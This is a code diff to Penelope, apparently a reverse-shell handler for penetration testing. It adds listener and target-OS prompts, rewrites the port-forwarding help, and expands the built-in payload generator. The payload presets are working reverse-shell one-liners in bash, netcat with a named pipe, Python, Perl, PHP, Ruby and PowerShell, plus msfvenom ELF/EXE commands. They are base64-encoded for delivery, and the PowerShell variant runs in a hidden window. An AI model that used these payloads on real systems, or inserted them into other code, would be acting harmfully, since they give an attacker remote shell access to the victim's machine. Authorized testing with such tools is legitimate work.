@@ -588,6 +588,45 @@ def ask(text):
 			print("^C")
 			return ' '
 
+def ask_listener():
+	"""Pick which Listener the payloads should point at. Returns the chosen Listeners,
+	or None if the question was not answered. Does not ask when there is only one."""
+	listeners = list(core.listeners.values())
+	if len(listeners) < 2:
+		return listeners
+
+	table = Table(joinchar=' | ')
+	table.header = [paint(header).orange for header in ('ID', 'Host', 'Port')]
+	for listener in listeners:
+		table += [listener.id, listener.host, listener.port]
+	print('\n', indent(str(table), '  '), '\n', sep='')
+
+	while True:
+		answer = ask("Listener ID? (<id>/*): ").strip()
+		if not answer:
+			return None
+		if answer == '*':
+			return listeners
+		try:
+			return [core.listeners[int(answer)]]
+		except (KeyError, ValueError):
+			logger.warning("Invalid Listener ID")
+
+def ask_target_os():
+	"""Ask which OS the target runs, so we only show payloads that can run there.
+	Returns None if the question was not answered (empty input, Ctrl-C, or no tty)."""
+	numbered = {'1': 'linux', '2': 'windows', '3': 'both'}
+	while True:
+		answer = ask("Target OS? (1/linux, 2/windows, 3/both): ").strip().lower()
+		if not answer:
+			return None
+		if answer in numbered:
+			return numbered[answer]
+		for choice in ('linux', 'windows', 'both'):
+			if choice.startswith(answer):
+				return choice
+		logger.warning("Answer 1/linux, 2/windows or 3/both")
+
 def my_input(text="", histfile=None, histlen=None, completer=lambda text, state: None, completer_delims=None):
 	readline_quote_chars_saved = None
 	if threading.current_thread().name == 'MainThread':
@@ -1212,15 +1251,19 @@ class MainMenu(BetterCMD):
 
 	def do_portfwd(self, line):
 		"""
-		[<host:port> (->|<-) <host:port> | stop <id>]
-		Local and Remote port forwarding
+		[<local host:port> -> <remote host:port> | stop <id|*>]
+		Forward a local port through the session to a host the target can reach
+		The left side is on your machine and the right side is resolved by the target: Penelope
+		listens on the left, and each connection is tunneled through the session so that the
+		target is the one connecting to the right. Select a session first with "use <ID>".
 
 		Examples:
 
-			portfwd					Show active Port Forwards
-			portfwd -> 192.168.0.1:80		Forward 127.0.0.1:80 to 192.168.0.1:80
-			portfwd 8888 -> 192.168.0.1:80		Forward 127.0.0.1:8888 to 192.168.0.1:80
-			portfwd 0.0.0.0:8080 -> 192.168.0.1:80	Forward 0.0.0.0:8080 to 192.168.0.1:80
+			portfwd -> 127.0.0.1:3306		Reach the target's own MySQL on your 127.0.0.1:3306
+			portfwd 3307 -> 127.0.0.1:3306		Same, but listen on your 127.0.0.1:3307
+			portfwd -> 192.168.0.1:80		Reach 192.168.0.1:80 from the target's network, on your 127.0.0.1:80
+			portfwd 0.0.0.0:8080 -> 192.168.0.1:80	Same, but listen on 0.0.0.0:8080 so others can use it too
+			portfwd					List the active Port Forwards and their IDs
 			portfwd stop 1				Stop the Port Forward with ID 1
 			portfwd stop *				Stop all Port Forwards
 		"""
@@ -1672,13 +1715,25 @@ class MainMenu(BetterCMD):
 		"""
 		[interface_name]
 		Show example reverse-shell commands for the active listeners
+		Asks which Listener to point at, and whether the target runs Linux or Windows, so you
+		only get the payloads that can actually run there. Answer "*" for every Listener and
+		"both" for every payload.
 		"""
-		if core.listeners:
-			print()
-			for listener in list(core.listeners.values()):
-				print(listener.payloads(line))
-		else:
+		if not core.listeners:
 			cmdlogger.warning("No Listeners to show payloads")
+			return
+
+		listeners = ask_listener()
+		if not listeners:
+			return
+
+		target_os = ask_target_os()
+		if not target_os:
+			return
+
+		print()
+		for listener in listeners:
+			print(listener.payloads(line, target_os))
 
 	def do_Interfaces(self, line):
 		"""
@@ -2391,14 +2446,26 @@ class TCPListener:
 		else:
 			logger.warning(f"Stopping {self}")
 
-	def payloads(self, interface_filter=None):
+	def payloads(self, interface_filter=None, target_os='both'):
 		pairs = Interfaces().pairs
 		name_of_ip = {ip: name for name, ip in pairs}
-		presets = [
-			"(bash >& /dev/tcp/{}/{} 0>&1) &",
-			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
-			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
-		]
+		presets = {
+			"bash": "(bash >& /dev/tcp/{}/{} 0>&1) &",
+			"nc_fifo": "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
+			"python3": '(python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\') >/dev/null 2>&1 &',
+			"perl": '(perl -e \'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");}};\') >/dev/null 2>&1 &',
+			"php": '(php -r \'$sock=fsockopen("{}",{});exec("/bin/sh <&3 >&3 2>&3");\') >/dev/null 2>&1 &',
+			"ruby": '(ruby -rsocket -e \'c=TCPSocket.new("{}",{});$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "/bin/sh"\') >/dev/null 2>&1 &',
+			"msfvenom_elf": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={} LPORT={} -f elf -o shell.elf",
+			"msfvenom_exe": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -f exe -o shell.exe",
+			"powershell": '$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()', # Taken from revshells.com
+		}
+
+		def oneliner(name, shell, ip, port):
+			# The target gets the payload base64 encoded, so quoting survives whatever
+			# mangles it on the way in.
+			payload = base64.b64encode(presets[name].format(ip, port).encode()).decode()
+			return f"printf {payload}|base64 -d|{shell}"
 
 		output = [str(paint(self).white_MAGENTA)]
 		output.append("")
@@ -2422,22 +2489,33 @@ class TCPListener:
 				iface_name = paint(iface_name).GREEN_black
 			interface_count += 1
 			output.extend((f'➤  {iface_name} → {str(paint(ip).cyan)}:{str(paint(port).orange)}', ''))
-			output.append(str(paint("Bash TCP").UNDERLINE))
-			output.append(f"printf {base64.b64encode(presets[0].format(ip, port).encode()).decode()}|base64 -d|bash")
-			output.append("")
-			output.append(str(paint("Netcat + named pipe").UNDERLINE))
-			output.append(f"printf {base64.b64encode(presets[1].format(ip, port).encode()).decode()}|base64 -d|sh")
-			output.append("")
-			output.append(str(paint("Powershell").UNDERLINE))
-			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, port).encode("utf-16le")).decode())
+			blocks = []
+			if target_os in ('linux', 'both'):
+				blocks.append(("Bash TCP", oneliner("bash", "bash", ip, port)))
+				blocks.append(("Netcat + named pipe", oneliner("nc_fifo", "sh", ip, port)))
+				blocks.append(("Python3", oneliner("python3", "sh", ip, port)))
+				blocks.append(("Perl", oneliner("perl", "sh", ip, port)))
+				blocks.append(("PHP", oneliner("php", "sh", ip, port)))
+				blocks.append(("Ruby", oneliner("ruby", "sh", ip, port)))
+				# msfvenom runs on this machine, not on the target, so it is printed as is.
+				blocks.append(("Msfvenom ELF", presets["msfvenom_elf"].format(ip, port)))
+			if target_os in ('windows', 'both'):
+				blocks.append(("Powershell",
+					"cmd /c powershell -nop -w hidden -e " + base64.b64encode(presets["powershell"].format(ip, port).encode("utf-16le")).decode()))
+				blocks.append(("Msfvenom EXE", presets["msfvenom_exe"].format(ip, port)))
+			blocks.append(("Metasploit", "\n".join((
+				"set PAYLOAD generic/shell_reverse_tcp",
+				f"set LHOST {ip}",
+				f"set LPORT {port}",
+				"set DisablePayloadHandler true"
+			))))
 
-			output.extend(dedent(f"""
-			{paint('Metasploit').UNDERLINE}
-			set PAYLOAD generic/shell_reverse_tcp
-			set LHOST {ip}
-			set LPORT {port}
-			set DisablePayloadHandler true
-			""").split("\n"))
+			for index, (title, body) in enumerate(blocks):
+				if index:
+					output.append("")
+				output.append(str(paint(title).UNDERLINE))
+				output.append(body)
+			output.append("")
 
 		output.append("─" * 80)
 		if not interface_count:
@@ -7256,9 +7334,12 @@ def listener_menu():
 				break
 			elif command == 'p':
 				restore_tty()
-				print()
-				for listener in list(core.listeners.values()):
-					print(listener.payloads(), end='\n\n')
+				listeners = ask_listener()
+				target_os = ask_target_os() if listeners else None
+				if target_os:
+					print()
+					for listener in listeners:
+						print(listener.payloads(None, target_os), end='\n\n')
 			elif command == '\x0C':
 				os.system("clear")
 			elif command in ('q', '\x03'):
